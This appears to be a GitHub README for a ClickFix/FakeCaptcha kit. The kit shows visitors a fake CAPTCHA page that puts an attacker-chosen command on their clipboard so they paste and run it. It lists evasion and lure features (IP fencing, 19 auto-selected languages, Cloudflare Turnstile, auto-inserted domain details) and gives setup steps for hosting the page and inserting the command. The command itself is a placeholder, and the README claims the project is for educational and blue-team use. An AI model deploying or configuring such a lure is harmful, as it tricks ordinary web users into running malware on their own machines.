# ClickFix/FakeCaptcha Attack

<img width="975" height="771" alt="image" src="https://github.com/user-attachments/assets/48a19171-0726-4a6b-b900-476a65b92efa" />


## Features

- Allow/Block IP's based on hardcoded config
- Supports 19 languages, auto-selects CAPTCHA language based on the user's browser request
- Integrates Cloudflare Turnstile CAPTCHA
- Automatically inserts domain details


## Setup

1. Drop the JavaScript code into a Cloudflare Worker, Cloudflare Page, or any website hosting page.

2. Set your Clipboard Command:
```javascript
const JS = `
const CONFIG = {
    command: "Your Clipboard Command Here"
};`
```

3. Configure IP Fencing (optional):
```javascript
const ALLOWED_IPS = [];
```
---
## Warning
Created for educational/research/blue-team purposes only! 

###### This project is a fork of ClickFix-Turnstile. Credit to the original: https://github.com/0x204/ClickFix-Turnstile
